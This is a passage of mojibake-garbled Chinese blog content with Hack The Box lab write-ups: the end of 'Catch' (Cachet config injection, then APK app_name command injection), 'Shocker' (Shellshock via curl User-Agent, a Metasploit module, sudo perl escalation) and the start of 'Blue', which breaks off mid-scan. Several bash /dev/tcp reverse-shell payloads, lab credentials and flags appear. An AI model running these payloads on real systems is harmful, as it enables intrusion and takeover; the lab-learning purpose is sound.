çš„æœåŠ¡å™¨ï¼Œå»æœç´¢ä¸€ä¸‹æ¼æ´\n\n![](Hackthebox-Catch/1f547117-160c-4b87-ad11-3867a76705fa.png)\n\næ‰¾åˆ°äº†ä¸€ç¯‡ Cachet 2.4ï¼šé€šè¿‡ Laravel é…ç½®æ³¨å…¥æ‰§è¡Œä»£ç  CVE-2021-39165\n\n> [https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection)\n\næ ¹æ®æ–‡ç« æè¿°ï¼Œæ‹¦æˆª EMAIL çš„åŒ…ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸ºæ³¨å…¥è¯­å¥å°±è¡Œäº†\n\nä¿®æ”¹ä¸º \\${DB\\_USERNAME}\n\n![](Hackthebox-Catch/315e86c7-732c-4c23-acfe-1e3360e4907f.png)\n\nä¿®æ”¹ä¸º \\${DB\\_PASSWORD}\n\n![](Hackthebox-Catch/69151011-17e6-49a2-9f9f-12f2ab7edb88.png)\n\n```bash\nusername = will\npassowrd = s2#4Fg0_%3!\n```\nå¾—åˆ°äº†ä¸€ç»„è´¦å·å¯†ç ï¼Œå»ç™»é™† ssh\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh will@10.10.11.150\nwill@10.10.11.150's password: \nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed 06 Apr 2022 08:41:02 AM UTC\n\n  System load:                      0.19\n  Usage of /:                       75.6% of 16.61GB\n  Memory usage:                     83%\n  Swap usage:                       33%\n  Processes:                        448\n  Users logged in:                  0\n  IPv4 address for br-535b7cf3a728: 172.18.0.1\n  IPv4 address for br-fe1b5695b604: 172.19.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for eth0:            10.10.11.150\n  IPv6 address for eth0:            dead:beef::250:56ff:feb9:ffd\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Wed Apr  6 08:40:51 2022 from 10.10.14.9\nwill@catch:~$ whoami&&id\nwill\nuid=1000(will) gid=1000(will) groups=1000(will)\n```\nç™»é™†æˆåŠŸ\n\n```bash\nwill@catch:~$ ls\nuser.txt\nwill@catch:~$ cat user.txt \n24b48fcc5b166f68a855af04633081c7\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nwill@catch:~$ sudo -l\n[sudo] password for will: \nSorry, user will may not run sudo on catch.\n```\næŸ¥çœ‹ sudo -l å¤±è´¥ï¼Œé‚£çœ‹æ¥ä¸æ˜¯è¿™ä¸ªææƒæ€è·¯äº†\n\nå»è·‘äº†ä¸€ä¸‹ linpeas.sh\n\n```bash\n[+] Readable files belonging to root and readable by me but not world readable\n-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh\n-rw-r----- 1 root will 33 Apr  5 17:23 /home/will/user.txt\n```\nè¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª /opt/mdm/verify.sh æ–‡ä»¶ï¼Œå»è¿›ç¨‹æœä¸€ä¸‹\n\n```bash\nwill@catch:~$ ps auxw|grep verify.sh\nwill      386873  0.0  0.0   6436   656 pts/0    S+   08:59   0:00 grep --color=auto verify.sh\n```\nä¹Ÿæœ‰è¿è¡Œè®°å½•ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶\n\n```bash\nwill@catch:~$ cat /opt/mdm/verify.sh\n#!/bin/bash\n\n###################\n# Signature Check #\n###################\n\nsig_check() {\n        jarsigner -verify \"$1/$2\" 2>/dev/null >/dev/null\n        if [[ $? -eq 0 ]]; then\n                echo '[+] Signature Check Passed'\n        else\n                echo '[!] Signature Check Failed. Invalid Certificate.'\n                cleanup\n                exit\n        fi\n}\n\n#######################\n# Compatibility Check #\n#######################\n\ncomp_check() {\n        apktool d -s \"$1/$2\" -o $3 2>/dev/null >/dev/null\n        COMPILE_SDK_VER=$(grep -oPm1 \"(?<=compileSdkVersion=\\\")[^\\\"]+\" \"$PROCESS_BIN/AndroidManifest.xml\")\n        if [ -z \"$COMPILE_SDK_VER\" ]; then\n                echo '[!] Failed to find target SDK version.'\n                cleanup\n                exit\n        else\n                if [ $COMPILE_SDK_VER -lt 18 ]; then\n                        echo \"[!] APK Doesn't meet the requirements\"\n                        cleanup\n                        exit\n                fi\n        fi\n}\n\n####################\n# Basic App Checks #\n####################\n\napp_check() {\n        APP_NAME=$(grep -oPm1 \"(?<=<string name=\\\"app_name\\\">)[^<]+\" \"$1/res/values/strings.xml\")\n        echo $APP_NAME\n        if [[ $APP_NAME == *\"Catch\"* ]]; then\n                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'\n                mv \"$3/$APK_NAME\" \"$2/$APP_NAME/$4\"\n        else\n                echo \"[!] App doesn't belong to Catch Global\"\n                cleanup\n                exit\n        fi\n}\n\n###########\n# Cleanup #\n###########\n\ncleanup() {\n        rm -rf $PROCESS_BIN;rm -rf \"$DROPBOX/*\" \"$IN_FOLDER/*\";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)\n}\n\n###################\n# MDM CheckerV1.0 #\n###################\n\nDROPBOX=/opt/mdm/apk_bin\nIN_FOLDER=/root/mdm/apk_bin\nOUT_FOLDER=/root/mdm/certified_apps\nPROCESS_BIN=/root/mdm/process_bin\n\nfor IN_APK_NAME in $DROPBOX/*.apk;do\n        OUT_APK_NAME=\"$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk\"\n        APK_NAME=\"$(openssl rand -hex 12).apk\"\n        if [[ -L \"$IN_APK_NAME\" ]]; then\n                exit\n        else\n                mv \"$IN_APK_NAME\" \"$IN_FOLDER/$APK_NAME\"\n        fi\n        sig_check $IN_FOLDER $APK_NAME\n        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN\n        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME\ndone\ncleanup\n```\nè¿™é‡Œçš„ app\\_check() å‡½æ•°æœ‰é—®é¢˜\n\nå®ƒåœ¨ /res/values/strings.xml çš„ APK ä¸­æœç´¢ APP\\_NAME\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸‹ åšä¸€ä¸ªå‘½ä»¤æ³¨å…¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo '/bin/bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'|base64\nL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==|base64 -d\n/bin/bash -i >& /dev/tcp/10.10.14.9/4444 0>&1\n```\nç„¶åç¼–å†™ä¸€ä¸‹ payload\n\n```bash\n<string name=\"app_name\">Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== | base64 -d | bash</string>\n```\nç„¶åä½¿ç”¨ä¸Šé¢çš„ payload æ›¿æ¢ /res/values/strings.xml çš„ç¬¬ 30 è¡Œ app\\_name è¿™ä¸€è¡Œ\n\næ¥ç€ä½¿ç”¨ nc -nvlp ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åå»ä½¿ç”¨ github ä¸Šæœ€æ–°ç‰ˆæœ¬ 2.6.1 çš„ apktool æ¥æ‰“åŒ…æ„é€ æ–°çš„ app\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# java -jar apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk                                                                        1 â¨¯\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nI: Using Apktool 2.6.1\nI: Smaling smali folder into classes.dex...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\nI: Built apk...\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# ls\napktool_2.6.1.jar  catchv1.0  catchv1.0.apk  catchv2.0.apk\n```\nç„¶åå»ç»™ apk ç­¾åï¼Œå¹¶ä¸”éªŒè¯\n\n```bash\nkeytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000\n\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_name\n\njarsigner -verify -verbose -certs catchv2.0.apk\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nè¾“å…¥å¯†é’¥åº“å£ä»¤:  \nå†æ¬¡è¾“å…¥æ–°å£ä»¤: \næ‚¨çš„åå­—ä¸å§“æ°æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \næ‚¨çš„ç»„ç»‡å•ä½åç§°æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \næ‚¨çš„ç»„ç»‡åç§°æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \næ‚¨æ‰€åœ¨çš„åŸå¸‚æˆ–åŒºåŸŸåç§°æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \næ‚¨æ‰€åœ¨çš„çœ/å¸‚/è‡ªæ²»åŒºåç§°æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \nè¯¥å•ä½çš„åŒå­—æ¯å›½å®¶/åœ°åŒºä»£ç æ˜¯ä»€ä¹ˆ?\n  [Unknown]:  \nCN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknownæ˜¯å¦æ­£ç¡®?\n  [å¦]:  y\n\næ­£åœ¨ä¸ºä»¥ä¸‹å¯¹è±¡ç”Ÿæˆ 2,048 ä½RSAå¯†é’¥å¯¹å’Œè‡ªç­¾åè¯ä¹¦ (SHA256withRSA) (æœ‰æ•ˆæœŸä¸º 10,000 å¤©):\n         CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown\n[æ­£åœ¨å­˜å‚¨my-release-key.keystore]\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# ls my-release-key.keystore \nmy-release-key.keystore\n```\nç”Ÿæˆäº†ä¸€ä¸ªç­¾åæ–‡ä»¶ï¼Œç„¶åéªŒè¯å†…å®¹è¾ƒå¤šï¼Œå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œå¤§å®¶è‡ªè¡ŒéªŒè¯å³å¯\n\nä½¿ç”¨ python3 -m å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡å™¨\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/catch]\nâ””â”€# python3 -m http.server 80 \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\nç„¶åä½¿ç”¨ wget ä¸‹è½½è¿™ä¸ª apk\n\n```bash\nwill@catch:~$ wget http://10.10.14.9/catchv2.0.apk\n--2022-04-06 09:28:38--  http://10.10.14.9/catchv2.0.apk\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2821343 (2.7M) [application/vnd.android.package-archive]\nSaving to: â€˜catchv2.0.apkâ€™\n\ncatchv2.0.apk                       100%[=================================================================>]   2.69M   869KB/s    in 3.2s    \n\n2022-04-06 09:28:42 (869 KB/s) - â€˜catchv2.0.apkâ€™ saved [2821343/2821343]\n```\nç„¶åå°†ä¸‹è½½çš„ apk æ”¾å…¥ `/opt/mdm/apk_bin` æ–‡ä»¶å¤¹\n\n```bash\nwill@catch:~$ cp catchv2.0.apk /opt/mdm/apk_bin\nwill@catch:~$ ls /opt/mdm/apk_bin\ncatchv2.0.apk\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.11.150] 34410\nbash: cannot set terminal process group (397832): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@catch:~# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\nç„¶åç­‰å¾…ä¸€ä¼šå„¿ï¼Œæˆ‘ä»¬å°±ä¼šè·å¾—ä¸€ä¸ª root æƒé™çš„ shell\n\n```bash\nroot@catch:~# cd /root\ncd /root\nroot@catch:~# cat root.txt\ncat root.txt\n36160af074e848d9139b7d14c9c4e5ca\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Shocker - Hackthebox","url":"/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/","content":"\n# Hackthebox - Shocker\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Shocker/64c68867-7663-4f1f-9728-ec9bb0e80ddf.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Shocker/06ff7eaf-ae61-43de-aaab-3e046685bddb.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Shocker]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-01 22:29 EDT\nNmap scan report for 10.10.10.56\nHost is up (0.25s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/1%OT=80%CT=1%CU=41565%PV=Y%DS=2%DC=T%G=Y%TM=6247B561\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ(\nOS:SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=B)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%T\nOS:S=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=\nOS:M505ST11NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7\nOS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A\nOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%\nOS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=\nOS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=\nOS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%\nOS:T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 61716/tcp)\nHOP RTT       ADDRESS\n1   246.66 ms 10.10.14.1\n2   246.79 ms 10.10.10.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 67.63 seconds\n```\n## Http\n![](Hackthebox-Shocker/5e3364e2-f2d4-4223-8013-e69a2527d7d4.png)\n\nè¿™é‡Œä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz ä¸€ä¸‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.10.56/FUZZ\" -w /usr/share/dirb/wordlists/common.txt                                   \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.56/FUZZ\n :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n                        [Status: 200, Size: 137, Words: 9, Lines: 10]\n.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]\n.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]\n.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]\ncgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12]\nindex.html              [Status: 200, Size: 137, Words: 9, Lines: 10]\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12]\n:: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:01:00] :: Errors: 0 ::\n```\nçœ‹åˆ°æœ‰ä¸€ä¸ª cgi-bin ç›®å½•ï¼Œç»§ç»­ fuzz\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.10.56/cgi-bin/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .sh,.pl\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.56/cgi-bin/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Extensions       : .sh .pl \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nuser.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]\n                        [Status: 403, Size: 294, Words: 22, Lines: 12]\n:: Progress: [60348/60348] :: Job [1/1] :: 152 req/sec :: Duration: [0:15:14] :: Errors: 19 ::\n```\nå‘ç°ä¸€ä¸ª user.sh æ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Shocker/5c08d0f2-9ef0-4c87-8204-d320484e4c83.png)\n\næœ‰ç‚¹ä¸å¤ªæ˜ç™½è¿™æ˜¯å•¥ï¼Œå» google ä¸€ä¸‹å§\n\n![](Hackthebox-Shocker/77210a46-884f-46be-a4ad-9612a2e8a223.png)\n\n> [https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)\n\næ‰¾åˆ°ä¸€ç¯‡æ–‡ç« \n\n# æ¼æ´åˆ©ç”¨\n## Shellshock\næ ¹æ®æ–‡ç« å†…å®¹ï¼Œå°è¯•ä¸€ä¸‹åå¼¹ shell\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åå»åˆ©ç”¨\n\n```bash\ncurl -i -H \"User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1\" http://10.10.10.56/cgi-bin/user.sh\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                                                                                                                                                                               1 â¨¯\nlistening on [any] 4444 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 40320\nbash: no job control in this shell\nshelly@Shocker:/usr/lib/cgi-bin$ whoami&&id\nwhoami&&id\nshelly\nuid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)\nshelly@Shocker:/usr/lib/cgi-bin$\n```\næˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ shell\n\n## exploit-db\n> [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)\n\næˆ‘è¿™è¾¹åˆ©ç”¨æœ‰ç‚¹é—®é¢˜ï¼Œå°±ä¸æµ‹è¯•äº†\n\n## Metasploit\n```bash\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\n```\n```bash\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options \n\nModule options (exploit/multi/http/apache_mod_cgi_bash_env_exec):\n\n   Name            Current Setting   Required  Description\n   ----            ---------------   --------  -----------\n   CMD_MAX_LENGTH  2048              yes       CMD max line length\n   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)\n   HEADER          User-Agent        yes       HTTP header to use\n   METHOD          GET               yes       HTTP method to use\n   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS          10.10.10.56       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager\n   RPORT           80                yes       The target port (TCP)\n   SRVHOST         0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT         8080              yes       The local port to listen on.\n   SSL             false             no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script\n   TIMEOUT         5                 yes       HTTP read response timeout (seconds)\n   URIPATH                           no        The URI to use for this exploit (default is random)\n   VHOST                             no        HTTP server virtual host\n\nPayload options (linux/x86/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Linux x86\n```\nè®¾ç½®å¥½ç›¸å…³çš„é…ç½®åï¼Œæ‰§è¡Œ\n\n```bash\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.14.4:4444 \n[*] Command Stager progress - 100.46% done (1097/1092 bytes)\n[*] Sending stage (984904 bytes) to 10.10.10.56\n[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.10.10.56:40322) at 2022-04-02 00:56:02 -0400\n\nmeterpreter > getuid\nServer username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)\n```\nè¿™é‡Œä¹ŸæˆåŠŸå›å¼¹\n\n## ä¿®å¤ shell\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Zè¿”å›\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n```bash\nshelly@Shocker:/home/shelly$ cat user.txt \n2ec24e11320026d1e70ff3e16695b233\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nshelly@Shocker:/home/shelly$ sudo -l\nMatching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl\n```\nä½¿ç”¨ sudo -l æŸ¥çœ‹å¾—çŸ¥æœ‰æƒé™ä½¿ç”¨ sudo è¿è¡Œ /usr/bin/perl\n\n> [https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)\n\nperl å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•ææƒï¼Œå°è¯•ä¸€ä¸‹\n\n```bash\nsudo /usr/bin/perl -e 'exec \"/bin/sh\";'\n\nshelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec \"/bin/sh\";'\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\n# cat root.txt\n52c2715605d70c7619030560dc1ca467\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Blue - Hackthebox","url":"/2022/04/03/Hackthebox/Easy/Hackthebox-Blue/","content":"\n# Hackthebox - Blue\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Blue/21028bc5-93be-4895-922f-8482f48df346.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Blue/e4037710-db52-4942-941f-0f5c0f5d5016.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Blue]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.40 \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:22 EDT\nNmap scan report for 10.10.10.40\nHost is up (0.57s latency).\nNot shown: 60896 filtered ports, 4636 closed ports\nPORT    STATE SERVICE    VERSION\n135/tcp open  tcpwrapped\n139/tcp open  tcpwrapped\n445/tcp open  tcpwrapped Windows 7 Professional 7601 Service Pack 1 tcpwrapped\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=3/30%OT=445%CT=21%CU=36006%PV=Y%DS=2%DC=T%G=Y%TM=6243D\nOS:C0A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II\nOS:=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW\nOS:8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=\nOS:2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=N%Q=)T1(R=\nOS:N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%DF=Y%T=80%W=0%S=Z\nOS:%A=S%F=AR%O=%RD=0%Q=)T3(R=N)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=\nOS:)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T\nOS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R\nOS:%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)\nOS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)I\nOS:E(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\n\nHost script results:\n|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-03-30T05:26:31+01:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: 